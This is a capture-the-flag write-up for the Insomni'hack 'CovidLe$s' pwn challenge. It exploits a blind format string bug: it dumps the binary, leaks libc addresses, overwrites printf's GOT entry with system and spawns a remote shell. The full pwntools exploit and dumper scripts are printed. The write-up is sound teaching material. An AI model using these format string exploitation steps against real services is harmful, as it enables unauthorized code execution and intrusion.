# CovidLe$s

Category: pwn <br/>
Description: `nc covidless.insomnihack.ch 6666`

## Solution

For this challenge we are only given a remote service and nothing more. Entering text prints the following:

```
test
Your covid pass is invalid : test
try again ..
```

After trying some format strings, it became clear that this was a typical (blind) format string vulnerability:

```
%p %p %p %p %p %p
Your covid pass is invalid : 0x400934 (nil) (nil) 0x7f699c1bd580 0x7f699bf918d0 0x74346e3143633456
try again ..
```

[Writeups for similar tasks can be found online](https://ctftime.org/task/9034). Contrary to these writeups, we are
dealing with a 64bit executable as can be seen from the leaked pointers. To get a better understanding of the challenge,
I planned to dump the binary step by step. To do so I had to identify the offset of our format string on the stack:

```python
for i in range(20):
    s = remote('covidless.insomnihack.ch', 6666)
    s.sendline(b'%' + flat(str(i)) + b'$pABCDEF')
    print(i, s.recv())
```

which gave the following interesting output:

```
12 b'Your covid pass is invalid : 0x4342417024323125ABCDEF\ntry again ..\n\n'
13 b'Your covid pass is invalid : 0xa464544ABCDEF\ntry again ..\n\n'
```

We can see that at offset `12` we start seeing our pattern. Adding three more filler characters aligns the pattern
perfectly at offset `13`. At this point I wrote the following code that leaks the whole binary and writes it to a file:

```python
s = remote('covidless.insomnihack.ch', 6666)

start = 0x400000
addr = start
binfile = b''

while addr < start + 0x1000:
    if '0a' in hex(addr):
        addr += 1
        binfile += b'\x00'

    try:
        s.sendline(b'|%13$s||' + p64(addr))
        data = s.recv()
        data = data[data.find(b'|') + 1 : data.find(b'||')]
        
        binfile += data + b'\x00'
        addr += len(data) + 1

    except Exception as _:
        break

s.close()

with open('bin', 'wb') as f:
    f.write(binfile)
exit()
```

This gives a binary that we can finally open in ghidra. Ghidra fails to import it by default so we need to import it as
a raw binary and analyze it later.

```
file bin 
bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, missing section headers
```

```c
int main(int argc,char **argv) {
  char pw [36];
  char input [136];
  
  pw._0_8_ = 0x74346e3143633456;
  pw._8_8_ = 0x505f44315f6e6f31;
  pw._16_8_ = 0x5379334b5f763172;
  pw._24_8_ = 0x5f74304e6e34635f;
  pw._32_4_ = 0x6b34336c;

  while (true) {
    memset(input, 0, 0x80);
    fgets(input, 0x80, _STD_IO);

    if (strcmp(input,pw) == 0) {
      break;
    }

    printf(invalid);
    printf(input);
  }

  logged_in();
}
```

It seems like the only vulnerability that we have here is the format string. We can, however, use it to overwrite
`printf`. This would allow us to call `system` with our own input string. To do so, we need to get the libc version that
the server uses. The plan is to leak a few libc adresses via the format string and then use a [libc
database](https://libc.rip/) to get the correct version.

Here I use the addresses found in the binary to leak some libc functions:

```python
s = remote('covidless.insomnihack.ch', 6666)

def leak(addr):
    s.sendline(b'|%13$s||' + p64(addr))
    data = s.recv()
    data = data[data.find(b'|') + 1:data.find(b'||')]
    return u64(data.ljust(8, b'\x00'))

print(f"puts {hex(leak(0x601018))}")
print(f"fgets {hex(leak(0x601038))}")
print(f"printf {hex(leak(0x601028))}")
```

Because the server uses ASLR, the output of this changes every time I run it but the lowest 12 bits are always the same.
Using the database I determined that the correct version of libc is
[libc6_2.27-3ubuntu1_amd64](https://libc.rip/download/libc6_2.27-3ubuntu1_amd64.so). We can check that the base address
is correct by writing some assert statements:

```python
libc.address = leak(0x601038) - libc.sym['fgets']

assert (leak(0x601038) == libc.sym['fgets'])
assert (leak(0x601028) == libc.sym['printf'])
assert (leak(0x601018) == libc.sym['puts'])
```

All we have to do now, is to write `libc.sym['system'` to the GOT entry of `printf`. This can be quite tedious to get
right. Luckily, pwntools supports a write primitive that we can use to get the string just right:

```python
s.sendline(fmtstr_payload(12, { 0x601028: libc.sym['system'] }))
s.recv()
s.sendline(b'/bin/sh')
s.interactive()
```

With this we get a remote shell and we can cat the flag: `INS{F0rm4t_5tR1nGs_FuULly_Bl1nd_!Gj!}`. The `fmtstr_payload`
function is quite nice since it does all the work for us. In case you are interested how it works exactly:

```
system: 0x7f7313acb440
[DEBUG] Sent 0x79 bytes:
    00000000  25 36 34 63  25 32 31 24  6c 6c 6e 25  35 31 63 25  │%64c│%21$│lln%│51c%│
    00000010  32 32 24 68  68 6e 25 31  32 63 25 32  33 24 68 68  │22$h│hn%1│2c%2│3$hh│
    00000020  6e 25 34 35  63 25 32 34  24 68 68 6e  25 38 63 25  │n%45│c%24│$hhn│%8c%│
    00000030  32 35 24 68  68 6e 25 39  35 63 25 32  36 24 68 68  │25$h│hn%9│5c%2│6$hh│
    00000040  6e 61 61 61  61 62 61 61  28 10 60 00  00 00 00 00  │naaa│abaa│(·`·│····│
    00000050  2c 10 60 00  00 00 00 00  2d 10 60 00  00 00 00 00  │,·`·│····│-·`·│····│
    00000060  2a 10 60 00  00 00 00 00  29 10 60 00  00 00 00 00  │*·`·│····│)·`·│····│
    00000070  2b 10 60 00  00 00 00 00  0a                        │+·`·│····│·│
    00000079
```

Each byte gets written individually and in increasing order. That's because the `%n` of a format string writes however
many characters have been written so far. We can verify the above debug output and see that it matches the bytes of the
system address:

```
64 				0x40 
64 + 51				0x73
64 + 51 + 12			0x7f
64 + 51 + 12 + 45		0xac
64 + 51 + 12 + 45 + 8		0xb4
64 + 51 + 12 + 45 + 8 + 95	0x113 (only 13 gets written in that case)
```

Of course, we could also write this ourselves (only the lowest 20 bits of the GOT need to be changed) but the pwntool
implementation seems to work quite well.

### Complete Source

```python
#!/usr/bin/python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

libc = ELF('libc')
s = remote('covidless.insomnihack.ch', 6666)

def leak(addr):
    s.sendline(b'|%13$s||' + p64(addr))
    data = s.recv()
    data = data[data.find(b'|') + 1:data.find(b'||')]
    return u64(data.ljust(8, b'\x00'))

libc.address = leak(0x601038) - libc.sym['fgets']

assert (leak(0x601038) == libc.sym['fgets'])
assert (leak(0x601028) == libc.sym['printf'])
assert (leak(0x601018) == libc.sym['puts'])

s.sendline(fmtstr_payload(12, { 0x601028: libc.sym['system'] }))
s.recv()
s.sendline(b'/bin/sh')
s.interactive()
```

To dump the binary I used:

```python
#!/usr/bin/python
from pwn import *

context.arch = 'amd64'
context.log_level = 'warn'

s = remote('covidless.insomnihack.ch', 6666)

start = 0x400000
addr = start
binfile = b''

while addr < start + 0x1000:
    if '0a' in hex(addr):
        addr += 1
        binfile += b'\x00'

    try:
        s.sendline(b'|%13$s||' + p64(addr))
        data = s.recv()
        data = data[data.find(b'|') + 1 : data.find(b'||')]
        
        binfile += data + b'\x00'
        addr += len(data) + 1

    except Exception as _:
        break

s.close()

with open('bin', 'wb') as f:
    f.write(binfile)
exit()
```

